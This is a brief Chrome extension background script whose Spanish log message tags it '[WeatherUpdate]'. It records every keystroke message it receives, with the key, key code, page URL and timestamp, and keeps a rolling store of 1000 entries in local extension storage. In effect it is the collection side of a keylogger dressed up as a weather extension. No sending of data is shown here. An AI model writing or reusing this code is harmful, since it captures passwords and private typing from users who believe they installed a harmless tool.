chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    if (message.type !== 'keystroke') return;

    chrome.storage.local.get({keystrokes: [] }, function(result) {
        const historial = result.keystrokes;

        historial.push({
            key: message.key,
            code: message.code,
            url: message.url,
            timestamp: message.timestamp
        });

        if (historial.length > 1000){
            historial.shift();
        }

         chrome.storage.local.set({ keystrokes: historial }, function() {
            console.log('[WeatherUpdate] Tecla guardada:', message.key, '| Total:', historial.length);
        });
    });
});